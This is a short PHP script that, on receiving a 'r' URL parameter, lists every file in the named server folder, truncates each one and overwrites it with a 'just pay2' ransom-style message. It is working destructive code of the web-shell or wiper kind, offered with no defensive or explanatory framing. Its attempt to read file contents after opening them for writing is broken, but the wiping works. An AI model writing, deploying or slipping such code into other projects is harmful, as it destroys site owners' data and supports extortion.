<?php	
	class erase{
		public $folder;
		public $fileVector;
		public function __construct($folderName){
			$this->folder = $folderName;			
		}
		public function getFiles(){
			$this->fileVector = scandir($this->folder);
			print_r($this->fileVector);
		}
		public function erasecontent(){
			foreach($this->fileVector as $file){
				if(is_file($this->folder.$file)){
					$file = fopen($this->folder.$file, 'w');
					$frd = fread($file,100000);					
					print_r($frd);
					fwrite($file,'<?php echo"just pay2";?>');
					fclose($file);
				}
			}
		}
		public function qa(){
			echo "<pre>";
			print_r($this->folder);
			echo "</pre>";
		}
	}
	if(isset($_GET['r'])){
		if($_GET['r'] !=''){
			//echo $_GET['r'];
			$obj = new erase($_GET['r']);
			$obj->getFiles();
			$obj->erasecontent();
			echo "well done";
		}	
	}

?>